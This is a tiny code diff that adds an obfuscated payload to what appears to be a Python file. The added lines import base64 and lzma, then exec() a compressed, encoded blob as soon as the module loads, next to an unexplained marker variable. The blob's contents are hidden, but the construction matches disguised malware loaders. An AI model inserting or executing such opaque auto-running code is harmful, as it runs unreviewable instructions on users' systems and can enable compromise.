@@ -1,0 +1,4 @@
+
+__wodx__ = 'v1'
+import base64, lzma
+exec(lzma.decompress(base64.b64decode(b'/Td6WFoAAATm1rRGAgAhARYAAAB0L+Wj4AB2AF9dADIZSP9UxSFSLUCduApQbFjnIsmNBp2QOVJWWO9kLDXd+qoCd4GGTRzjeXTwGCd6qViWj2oYSYeDeOc0mLeldqjkfzH+z0I7WMeh4DyfswStK2vcUl/NIevfr9VsBM8GAADI13NhqAvTMwABe3eJ8SwiH7bzfQEAAAAABFla')))
